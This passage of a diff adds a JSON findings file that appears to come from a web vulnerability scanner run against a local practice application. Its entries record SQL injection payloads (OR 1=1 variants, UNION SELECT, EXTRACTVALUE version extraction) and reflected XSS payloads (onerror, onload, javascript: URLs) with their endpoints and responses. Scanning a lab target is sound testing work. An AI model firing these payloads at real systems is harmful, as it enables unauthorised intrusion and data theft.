+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "id"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4617
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:05",
+        "unix_timestamp": 1770474245
+      }
+    },
+    {
+      "id": 33,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli/",
+      "parameter": "id",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "id"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4617
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:07",
+        "unix_timestamp": 1770474247
+      }
+    },
+    {
+      "id": 34,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli/",
+      "parameter": "id",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "id"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4617
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:07",
+        "unix_timestamp": 1770474247
+      }
+    },
+    {
+      "id": 35,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli/",
+      "parameter": "id",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "id"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4617
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:08",
+        "unix_timestamp": 1770474248
+      }
+    },
+    {
+      "id": 36,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+      "parameter": "id",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "id"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4657
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:20",
+        "unix_timestamp": 1770474260
+      }
+    },
+    {
+      "id": 37,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+      "parameter": "id",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "id"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4657
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:20",
+        "unix_timestamp": 1770474260
+      }
+    },
+    {
+      "id": 38,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+      "parameter": "id",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "id"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4657
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:22",
+        "unix_timestamp": 1770474262
+      }
+    },
+    {
+      "id": 39,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+      "parameter": "id",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "id"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4657
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:23",
+        "unix_timestamp": 1770474263
+      }
+    },
+    {
+      "id": 40,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+      "parameter": "id",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "id"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4657
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:25",
+        "unix_timestamp": 1770474265
+      }
+    },
+    {
+      "id": 41,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_d/",
+      "parameter": "default",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "default"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4817
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:44",
+        "unix_timestamp": 1770474284
+      }
+    },
+    {
+      "id": 42,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_d/",
+      "parameter": "default",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "default"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4817
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:44",
+        "unix_timestamp": 1770474284
+      }
+    },
+    {
+      "id": 43,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_d/",
+      "parameter": "default",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "default"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4817
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:46",
+        "unix_timestamp": 1770474286
+      }
+    },
+    {
+      "id": 44,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_d/",
+      "parameter": "default",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "default"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4817
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:47",
+        "unix_timestamp": 1770474287
+      }
+    },
+    {
+      "id": 45,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_d/",
+      "parameter": "default",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "default"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4817
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:48",
+        "unix_timestamp": 1770474288
+      }
+    },
+    {
+      "id": 46,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "\"><img src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4394
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:51",
+        "unix_timestamp": 1770474291
+      }
+    },
+    {
+      "id": 47,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "' onfocus=alert(1) autofocus='",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4394
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:52",
+        "unix_timestamp": 1770474292
+      }
+    },
+    {
+      "id": 48,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<a href=\"javascript:alert(1)\">click</a>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4403
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:53",
+        "unix_timestamp": 1770474293
+      }
+    },
+    {
+      "id": 49,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<ScRiPt>alert(1)</sCrIpT>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4389
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:53",
+        "unix_timestamp": 1770474293
+      }
+    },
+    {
+      "id": 50,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<IMG SRC=\"javascript:alert(1);\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4396
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:53",
+        "unix_timestamp": 1770474293
+      }
+    },
+    {
+      "id": 51,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4394
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:54",
+        "unix_timestamp": 1770474294
+      }
+    },
+    {
+      "id": 52,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<body onload=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4386
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:54",
+        "unix_timestamp": 1770474294
+      }
+    },
+    {
+      "id": 53,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<details open ontoggle=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4396
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:55",
+        "unix_timestamp": 1770474295
+      }
+    },
+    {
+      "id": 54,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<img src=x onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4392
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:55",
+        "unix_timestamp": 1770474295
+      }
+    },
+    {
+      "id": 55,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<img src=x onerror=\"alert(1)\">",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4394
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:55",
+        "unix_timestamp": 1770474295
+      }
+    },
+    {
+      "id": 56,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4398
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:56",
+        "unix_timestamp": 1770474296
+      }
+    },
+    {
+      "id": 57,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<svg onload=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4385
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:57",
+        "unix_timestamp": 1770474297
+      }
+    },
+    {
+      "id": 58,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<video><source onerror=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4396
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:57",
+        "unix_timestamp": 1770474297
+      }
+    },
+    {
+      "id": 59,
+      "vulnerability_type": "XSS",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "<marquee onstart=alert(1)>",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4390
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:58",
+        "unix_timestamp": 1770474298
+      }
+    },
+    {
+      "id": 60,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4375
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:59",
+        "unix_timestamp": 1770474299
+      }
+    },
+    {
+      "id": 61,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4419
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:59",
+        "unix_timestamp": 1770474299
+      }
+    },
+    {
+      "id": 62,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4373
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:24:59",
+        "unix_timestamp": 1770474299
+      }
+    },
+    {
+      "id": 63,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4390
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:00",
+        "unix_timestamp": 1770474300
+      }
+    },
+    {
+      "id": 64,
+      "vulnerability_type": "SQLI",
